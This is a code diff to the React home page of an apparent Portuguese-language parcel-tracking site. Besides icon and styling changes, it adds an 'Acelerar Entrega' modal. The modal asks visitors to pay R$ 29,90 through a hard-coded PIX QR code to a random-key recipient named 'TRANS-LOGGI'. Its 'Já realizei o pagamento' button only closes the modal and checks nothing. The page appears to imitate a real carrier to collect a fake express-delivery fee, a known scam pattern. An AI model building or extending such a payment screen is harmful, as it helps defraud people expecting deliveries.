@@ -1,5 +1,5 @@
 import React, { useState, useEffect } from 'react';
-import { Search, Zap, ArrowRight, Globe, QrCode, Satellite, Package, Warehouse, GitBranch, RotateCcw, Smile, Star, Clock, TrendingUp, Calculator, MapPinned } from 'lucide-react';
+import { Search, Zap, ArrowRight, Globe, QrCode, Satellite, Package, Warehouse, GitBranch, RotateCcw, Smile, Star, Clock, TrendingUp, Calculator, MapPinned, Truck, CheckCircle } from 'lucide-react';
 import { Link } from 'react-router-dom';
 import Header from '../components/Header';
 import Footer from '../components/Footer';
@@ -14,6 +14,7 @@ const Home: React.FC = () => {
     const [trackError, setTrackError] = useState('');
     const [activeTab, setActiveTab] = useState<'voce' | 'empresas'>('voce');
     const [heroCounter, setHeroCounter] = useState(0);
+    const [showExpressModal, setShowExpressModal] = useState(false);
 
     // Observer para Animação de Entrada
     useEffect(() => {
@@ -85,11 +86,11 @@ const Home: React.FC = () => {
 
     const getStatusIcon = (status: string) => {
         const s = status.toLowerCase();
-        if (s.includes('saiu') || s.includes('entrega') || s.includes('rota')) return '🚚';
-        if (s.includes('trânsito') || s.includes('transito')) return '📦';
-        if (s.includes('postado') || s.includes('coletado')) return '📬';
-        if (s.includes('entregue')) return '✅';
-        return '📍';
+        if (s.includes('saiu') || s.includes('entrega') || s.includes('rota')) return <Truck size={32} color="#6366f1" />;
+        if (s.includes('trânsito') || s.includes('transito')) return <Package size={32} color="#818cf8" />;
+        if (s.includes('postado') || s.includes('coletado')) return <Warehouse size={32} color="#a855f7" />;
+        if (s.includes('entregue')) return <CheckCircle size={32} color="#10b981" />;
+        return <MapPinned size={32} color="#6366f1" />;
     };
 
     return (
@@ -617,12 +618,16 @@ const Home: React.FC = () => {
                 <div className="result-area" style={{ animation: 'fadeIn 0.5s ease' }}>
                     <div className="result-card">
                         <div className="status-header">
-                            <div className="status-icon-box">
-                                <span style={{ fontSize: '2rem' }}>{getStatusIcon(trackResult.etapas[trackResult.etapas.length - 1]?.status_atual || '')}</span>
+                            <div className="status-icon-box" style={{ background: 'rgba(99, 102, 241, 0.1)', border: '1px solid rgba(99, 102, 241, 0.2)' }}>
+                                {getStatusIcon(trackResult.etapas[trackResult.etapas.length - 1]?.status_atual || '')}
                             </div>
                             <div>
-                                <h3 style={{ fontSize: '1.3rem', fontWeight: 800 }}>{trackResult.etapas[trackResult.etapas.length - 1]?.status_atual || 'Em processamento'}</h3>
-                                <p style={{ color: 'rgba(255,255,255,0.4)', marginTop: '4px', fontSize: '0.9rem' }}>📍 {cidade}</p>
+                                <h3 style={{ fontSize: '1.4rem', fontWeight: 900, background: 'linear-gradient(135deg, #fff, #a5b4fc)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>
+                                    {trackResult.etapas[trackResult.etapas.length - 1]?.status_atual || 'Em processamento'}
+                                </h3>
+                                <p style={{ color: 'rgba(255,255,255,0.45)', marginTop: '4px', fontSize: '0.95rem', display: 'flex', alignItems: 'center', gap: '6px' }}>
+                                    <MapPinned size={14} /> {trackResult.cidade || cidade}
+                                </p>
                             </div>
                         </div>
                         <div>
@@ -650,7 +655,7 @@ const Home: React.FC = () => {
                             })}
                         </div>
                         <div className="express-box">
-                            <button className="express-btn">⚡ Acelerar por R$ 29,90</button>
+                            <button className="express-btn" onClick={() => setShowExpressModal(true)}>⚡ Acelerar por R$ 29,90</button>
                             <p style={{ color: 'rgba(255,255,255,0.35)', fontSize: '0.85rem', marginTop: '8px' }}>Receba em até 3 dias úteis</p>
                         </div>
                     </div>
@@ -760,6 +765,35 @@ const Home: React.FC = () => {
             </section>
 
             <Footer />
+
+            {/* Modal Acelerar */}
+            {showExpressModal && (
+                <div style={{ position: 'fixed', inset: 0, zIndex: 9999, background: 'rgba(0,0,0,0.85)', backdropFilter: 'blur(12px)', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }} onClick={() => setShowExpressModal(false)}>
+                    <div style={{ background: 'rgba(20, 20, 25, 0.95)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '32px', width: '100%', maxWidth: '440px', padding: '40px', boxShadow: '0 24px 80px rgba(0,0,0,0.5)', animation: 'fadeIn 0.3s ease', textAlign: 'center' }} onClick={e => e.stopPropagation()}>
+                        <div style={{ width: '80px', height: '80px', background: 'rgba(99, 102, 241, 0.1)', borderRadius: '24px', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 24px' }}>
+                            <Zap size={40} color="#6366f1" />
+                        </div>
+                        <h2 style={{ fontSize: '1.8rem', fontWeight: 900, marginBottom: '12px', fontFamily: 'Outfit, sans-serif' }}>Acelerar Entrega</h2>
+                        <p style={{ color: 'rgba(255,255,255,0.45)', lineHeight: 1.6, marginBottom: '32px' }}>
+                            Ao acelerar, seu pacote ganha prioridade máxima em nossa malha e será entregue em até <strong>3 dias úteis</strong>.
+                        </p>
+
+                        <div style={{ background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: '20px', padding: '24px', marginBottom: '32px' }}>
+                            <div style={{ fontSize: '0.8rem', color: '#818cf8', fontWeight: 700, textTransform: 'uppercase', marginBottom: '8px' }}>Pague via PIX</div>
+                            <div style={{ fontSize: '1.5rem', fontWeight: 900, color: '#fff', marginBottom: '16px' }}>R$ 29,90</div>
+                            <div style={{ background: '#fff', padding: '12px', borderRadius: '12px', marginBottom: '16px', display: 'inline-block' }}>
+                                <img src={`https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=00020126580014BR.GOV.BCB.PIX013666d6ed5c-9d62-4b2a-8c8a-7e1e6f966b96520400005303986540529.905802BR5913TRANS-LOGGI6009SAO-PAULO62070503***6304E21D`} alt="QR Code PIX" style={{ width: '150px', height: '150px' }} />
+                            </div>
+                            <p style={{ fontSize: '0.85rem', color: 'rgba(255,255,255,0.35)' }}>Escaneie o código acima ou pague pela chave vinculada.</p>
+                        </div>
+
+                        <button onClick={() => setShowExpressModal(false)} style={{ width: '100%', padding: '16px', background: 'linear-gradient(135deg, #6366f1, #a855f7)', border: 'none', borderRadius: '16px', color: '#fff', fontWeight: 800, fontSize: '1rem', cursor: 'pointer', boxShadow: '0 8px 24px rgba(99, 102, 241, 0.3)' }}>
+                            Já realizei o pagamento
+                        </button>
+                        <button onClick={() => setShowExpressModal(false)} style={{ background: 'none', border: 'none', color: 'rgba(255,255,255,0.3)', marginTop: '20px', cursor: 'pointer', fontWeight: 600 }}>Talvez mais tarde</button>
+                    </div>
+                </div>
+            )}
         </div>
     );
 };
